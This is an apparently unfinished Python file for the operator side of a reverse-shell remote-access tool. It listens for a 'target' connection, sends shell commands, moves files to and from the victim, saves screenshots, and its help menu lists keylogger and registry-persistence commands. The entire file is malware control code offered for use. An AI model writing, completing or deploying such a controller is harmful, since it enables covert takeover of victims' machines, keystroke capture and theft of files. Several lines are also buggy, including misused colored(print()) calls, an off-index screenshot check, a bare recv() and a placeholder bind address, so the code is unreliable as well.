import sys, os, socket, json
from termcolor import colored


##---------------- DRAFT ----------------##
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Local host IP address, port
sock.bind(('str: target_ip', 5555))
colored(print('[-_] Listening for incoming connections...'), 'yellow')
sock.listen(5)
## socket descriptor, target machine IP addr, port where connection comes from
target, ip = sock.accept()
colored(print(f'[+] Target connected from: {str(ip)}'), 'green')

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def download(file):
    f = open(file, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def upload_file(file):
    f = open(file, 'rb')
    target.send(f.read()) # don't need to encode because reading bytes
    
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip() # recieve 1024 bytes
            return json.loads(data)
        except ValueError:
            continue

def target_communication():
    count = 0
    while True:
        command = input('* Shell-%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download(command[9:])
        elif command[10:] == 'screenshot':
            f = open('screenshot.png%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            colored(print('Screenshot saved.'), 'green')
            count += 1
        elif command[:11] == 'persistence':
            pass
        elif command == 'help':
            colored(print('''\n
                          quit                                --> Quit session with target
                          clear                               --> Clear the screen
                          cd *Directory Name                  --> Change directory on target system
                          upload *filename*                   --> Upload file to target machine
                          download *filename*                 --> Download file from target machine
                          screenshot                          --> Screenshot target machine desktop
                          keylog_start                        --> Start keylogger
                          keylog_dump                         --> Print keystrokes from target machine
                          keylog_stop                         --> stop and self destruct keylogger file
                          persistence *Regname* *filename*    --> '''), 'purple')
        else:
            result = target.recv()
            print(result)